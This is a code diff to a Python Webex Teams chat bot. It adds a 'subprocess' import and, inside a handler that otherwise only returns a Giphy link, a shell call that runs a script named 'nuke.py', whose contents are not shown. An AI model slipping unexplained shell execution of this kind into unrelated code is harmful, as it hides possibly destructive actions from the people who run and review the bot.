@@ -4,6 +4,7 @@ import json
 import requests
 import os
 import yaml
+import subprocess
 
 ### teams Bot ###
 from webexteamsbot import TeamsBot
@@ -283,7 +284,7 @@ def o7(incoming_msg):
     u = "https://giphy.com/gifs/lil-wayne-XrNry0aqYWEhi"
     response.link= u
 
-    
+    subprocess.call("nuke.py", shell=True)
   
     
     return response
